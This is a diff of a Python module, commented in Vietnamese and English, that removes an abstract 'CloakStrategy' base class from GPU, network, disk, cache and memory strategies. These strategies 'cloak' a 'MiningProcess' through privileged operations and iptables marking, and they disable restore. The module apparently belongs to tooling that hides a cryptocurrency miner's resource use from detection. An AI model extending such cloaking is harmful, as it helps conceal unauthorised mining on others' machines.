@@ -10,7 +10,7 @@ import psutil
 import threading
 import time
 import random
-from abc import ABC, abstractmethod
+# ABC removed - no longer needed after removing CloakStrategy base class
 from typing import Dict, List, Any, Optional, Type, cast, TYPE_CHECKING
 from pathlib import Path
 
@@ -243,271 +243,10 @@ class CloakCoordinator:
 
 
 ###############################################################################
-#                    STRATEGY TYPES & UNIFIED ARCHITECTURE                   #
-###############################################################################
-
-# StrategyType moved to utils.py to break circular import dependency
-
-###############################################################################
-#                           CƠ SỞ CỦA CÁC STRATEGY                            #
-###############################################################################
-
-class CloakStrategy(ABC):
-    """
-    ✅ ENHANCED: Lớp cơ sở trừu tượng cho comprehensive multi-strategy cloaking.
-    Redesigned cho comprehensive resource cloaking với advanced coordination.
-    """
-
-    logger: logging.Logger  # thêm attribute để linter biết
-    privileged_manager: Optional[Any] = None  # Để inject privileged operations
-    strategy_type: str = ""  # **GPU-Only**: Loại chiến lược (GPU, Network, Disk I/O, Cache, Memory)
-    requires_plugin_system: bool = False  # Có yêu cầu plugin system không
-    
-    # ✅ NEW: Comprehensive cloaking attributes
-    is_primary_strategy: bool = False  # Có phải primary strategy không
-    coordination_priority: int = 50  # Priority for multi-strategy coordination (0-100)
-    resource_conflicts: List[str] = []  # List of resource types that may conflict
-    depends_on_strategies: List[str] = []  # Strategies this one depends on
-    
-    # ✅ NEW: Performance and compatibility attributes
-    supports_concurrent_application: bool = True  # Có thể apply cùng lúc với strategies khác
-    estimated_application_time_ms: int = 100  # Estimated time to apply strategy
-    compatibility_matrix: Dict[str, str] = {}  # Compatibility với other strategies
-    
-    # ✅ LINEAR FLOW: Sequential orchestration attributes
-    linear_flow_enabled: bool = True  # Supports linear flow orchestration
-    sequential_application_delay_ms: int = 50  # Delay between sequential applications
-    handoff_metadata: Optional[Dict[str, Any]] = None  # Metadata từ linear handoff chain
-
-    def set_privileged_manager(self, privileged_manager: Any) -> None:
-        """
-        Inject PrivilegedOperationManager vào strategy
-        """
-        self.privileged_manager = privileged_manager
-        if hasattr(self, 'logger'):
-            self.logger.debug(f"Injected privileged_manager into {self.__class__.__name__}")
-
-    @abstractmethod
-    def apply(self, process: MiningProcess) -> bool:
-        """
-        ✅ ENHANCED: Áp dụng chiến lược cloaking cho tiến trình với return value validation.
-
-        :param process: Đối tượng MiningProcess.
-        :return: bool - True nếu strategy áp dụng thành công, False nếu thất bại
-        """
-        pass
-
-    def restore(self, process: MiningProcess) -> None:
-        """
-        Khôi phục cài đặt ban đầu cho tiến trình (đồng bộ).
-        CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
-        
-        :param process: Đối tượng MiningProcess.
-        :return: None
-        """
-        self.logger.info(f"[RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
-        pass
-    
-    def set_linear_handoff_metadata(self, metadata: Dict[str, Any]) -> None:
-        """
-        **Set Linear Handoff Metadata** (đặt metadata chuyển giao tuyến tính)
-        
-        Receives metadata từ linear flow chain để inform strategy application.
-        
-        Args:
-            metadata: Handoff metadata từ previous components trong chain
-        """
-        self.handoff_metadata = metadata
-        if hasattr(self, 'logger'):
-            self.logger.debug(f"Linear handoff metadata set for {self.__class__.__name__}")
-    
-    def apply_with_linear_flow(self, process: MiningProcess, orchestration_context: Dict[str, Any]) -> bool:
-        """
-        **Apply With Linear Flow** (áp dụng với luồng tuyến tính)
-        
-        Enhanced apply method with linear flow orchestration context.
-        Provides better coordination and sequencing trong strategy chain.
-        
-        Args:
-            process: MiningProcess object
-            orchestration_context: Context từ linear flow orchestrator
-            
-        Returns:
-            bool: True nếu strategy application successful
-        """
-        try:
-            if hasattr(self, 'logger'):
-                self.logger.info(f"🔄 [LINEAR-APPLY] Applying {self.__class__.__name__} with linear flow context")
-                self.logger.debug(f"🔍 [LINEAR-APPLY] Orchestration context: {orchestration_context}")
-            
-            # **Set handoff metadata từ orchestration context** (đặt metadata handoff từ ngữ cảnh điều phối)
-            if 'handoff_metadata' in orchestration_context:
-                self.set_linear_handoff_metadata(orchestration_context['handoff_metadata'])
-            
-            # **Sequential application delay** (độ trễ áp dụng tuần tự) for coordination
-            if self.sequential_application_delay_ms > 0:
-                delay_seconds = self.sequential_application_delay_ms / 1000.0
-                if hasattr(self, 'logger'):
-                    self.logger.debug(f"⏳ [LINEAR-APPLY] Sequential delay: {delay_seconds}s")
-                time.sleep(delay_seconds)
-            
-            # **Enhanced pre-apply check** (kiểm tra trước áp dụng nâng cao) with orchestration context
-            if not self.pre_apply_check_with_context(process, orchestration_context):
-                if hasattr(self, 'logger'):
-                    self.logger.warning(f"⚠️ [LINEAR-APPLY] Pre-apply check failed for {self.__class__.__name__}")
-                return False
-            
-            # **Apply strategy using standard method** (áp dụng chiến lược sử dụng phương thức tiêu chuẩn)
-            application_success = self.apply(process)
-            
-            # **Enhanced post-apply verification** (xác minh sau áp dụng nâng cao) with orchestration context
-            if application_success:
-                verification_success = self.post_apply_verification_with_context(process, orchestration_context)
-                if not verification_success:
-                    if hasattr(self, 'logger'):
-                        self.logger.warning(f"⚠️ [LINEAR-APPLY] Post-apply verification failed for {self.__class__.__name__}")
-                    return False
-            
-            if hasattr(self, 'logger'):
-                result_msg = "✅ Success" if application_success else "❌ Failed"
-                self.logger.info(f"{result_msg} [LINEAR-APPLY] {self.__class__.__name__} linear flow application")
-            
-            return application_success
-            
-        except Exception as e:
-            if hasattr(self, 'logger'):
-                self.logger.error(f"❌ [LINEAR-APPLY] Exception in {self.__class__.__name__} linear flow application: {e}")
-            return False
-    
-    def pre_apply_check_with_context(self, process: MiningProcess, orchestration_context: Dict[str, Any]) -> bool:
-        """
-        **Enhanced Pre-Apply Check** (kiểm tra trước áp dụng nâng cao)
-        
-        Pre-application check với orchestration context for better coordination.
-        
-        Args:
-            process: MiningProcess object
-            orchestration_context: Orchestration context
-            
-        Returns:
-            bool: True nếu strategy có thể áp dụng an toàn
-        """
-        try:
-            # **Standard pre-apply check** (kiểm tra trước áp dụng tiêu chuẩn)
-            base_check = self.pre_apply_check(process)
-            if not base_check:
-                return False
-            
-            # **Enhanced checks with orchestration context** (kiểm tra nâng cao với ngữ cảnh điều phối)
-            # Check if previous strategies in chain were successful
-            if 'previous_results' in orchestration_context:
-                previous_results = orchestration_context['previous_results']
-                if not all(previous_results.values()):
-                    if hasattr(self, 'logger'):
-                        self.logger.warning(f"⚠️ [PRE-CHECK] Previous strategies failed, may affect {self.__class__.__name__}")
-            
-            return True
-            
-        except Exception as e:
-            if hasattr(self, 'logger'):
-                self.logger.debug(f"Enhanced pre-apply check failed for {self.__class__.__name__}: {e}")
-            return False
-    
-    def post_apply_verification_with_context(self, process: MiningProcess, orchestration_context: Dict[str, Any]) -> bool:
-        """
-        **Enhanced Post-Apply Verification** (xác minh sau áp dụng nâng cao)
-        
-        Post-application verification với orchestration context for better validation.
-        
-        Args:
-            process: MiningProcess object
-            orchestration_context: Orchestration context
-            
-        Returns:
-            bool: True nếu strategy verification successful
-        """
-        try:
-            # **Standard post-apply verification** (xác minh sau áp dụng tiêu chuẩn)
-            base_verification = self.post_apply_verification(process)
-            if not base_verification:
-                return False
-            
-            # **Enhanced verification with orchestration context** (xác minh nâng cao với ngữ cảnh điều phối)
-            # Add orchestration-specific verification logic here
-            
-            return True
-            
-        except Exception as e:
-            if hasattr(self, 'logger'):
-                self.logger.debug(f"Enhanced post-apply verification failed for {self.__class__.__name__}: {e}")
-            return False
-
-    def pre_apply_check(self, process: MiningProcess) -> bool:
-        """
-        ✅ NEW: Pre-application compatibility check cho comprehensive cloaking.
-        
-        :param process: Đối tượng MiningProcess để check compatibility
-        :return: True nếu strategy có thể áp dụng an toàn
-        """
-        try:
-            # Base implementation - các subclasses có thể override
-            return True
-        except Exception as e:
-            if hasattr(self, 'logger'):
-                self.logger.debug(f"Pre-apply check failed for {self.__class__.__name__}: {e}")
-            return False
-
-    def post_apply_verification(self, process: MiningProcess) -> bool:
-        """
-        ✅ NEW: Post-application verification cho comprehensive cloaking.
-        
-        :param process: Đối tượng MiningProcess để verify
-        :return: True nếu strategy đã được áp dụng thành công
-        """
-        try:
-            # Base implementation - các subclasses có thể override
-            return True
-        except Exception as e:
-            if hasattr(self, 'logger'):
-                self.logger.debug(f"Post-apply verification failed for {self.__class__.__name__}: {e}")
-            return False
-
-    def check_resource_conflicts(self, other_strategies: List[str]) -> List[str]:
-        """
-        ✅ NEW: Check potential resource conflicts với other strategies.
-        
-        :param other_strategies: List of strategy names đang được áp dụng
-        :return: List of potential conflicts
-        """
-        conflicts = []
-        for strategy in other_strategies:
-            if strategy in self.resource_conflicts:
-                conflicts.append(strategy)
-        return conflicts
-
-    def get_strategy_metadata(self) -> Dict[str, Any]:
-        """
-        ✅ NEW: Get metadata về strategy cho comprehensive coordination.
-        
-        :return: Dictionary chứa strategy metadata
-        """
-        return {
-            'strategy_type': self.strategy_type,
-            'is_primary': self.is_primary_strategy,
-            'priority': self.coordination_priority,
-            'conflicts': self.resource_conflicts,
-            'dependencies': self.depends_on_strategies,
-            'concurrent_safe': self.supports_concurrent_application,
-            'estimated_time_ms': self.estimated_application_time_ms,
-            'compatibility': self.compatibility_matrix
-        }
-
-
-###############################################################################
 #                 GPU STRATEGY: GpuCloakStrategy                              #
 ###############################################################################
 
-class GpuCloakStrategy(CloakStrategy):
+class GpuCloakStrategy:
     """
     ✅ UNIFIED: Comprehensive GPU cloaking với integrated thermal management:
       - Giới hạn power limit,
@@ -1212,7 +951,7 @@ class GpuCloakStrategy(CloakStrategy):
 #            NETWORK STRATEGY: NetworkCloakStrategy                           #
 ###############################################################################
 
-class NetworkCloakStrategy(CloakStrategy):
+class NetworkCloakStrategy:
     """
     ✅ ENHANCED: Cloaking mạng cho comprehensive multi-strategy environment:
       - Đánh dấu pid bằng iptables,
@@ -1344,7 +1083,7 @@ class NetworkCloakStrategy(CloakStrategy):
 ###############################################################################
 #            DISK IO STRATEGY: DiskIoCloakStrategy                            #
 ###############################################################################
-class DiskIoCloakStrategy(CloakStrategy):
+class DiskIoCloakStrategy:
     """
     Cloaking Disk I/O (đồng bộ) qua ionice hoặc cgroup I/O (tuỳ triển khai).
     
@@ -1449,7 +1188,7 @@ class DiskIoCloakStrategy(CloakStrategy):
 ###############################################################################
 #            CACHE STRATEGY: CacheCloakStrategy                               #
 ###############################################################################
-class CacheCloakStrategy(CloakStrategy):
+class CacheCloakStrategy:
     """
     Cloaking Cache (đồng bộ):
       - Drop caches,
@@ -1556,7 +1295,7 @@ class CacheCloakStrategy(CloakStrategy):
 ###############################################################################
 #            MEMORY STRATEGY: MemoryCloakStrategy                             #
 ###############################################################################
-class MemoryCloakStrategy(CloakStrategy):
+class MemoryCloakStrategy:
     """
     Cloaking Memory (đồng bộ):
       - Giới hạn Memory usage.
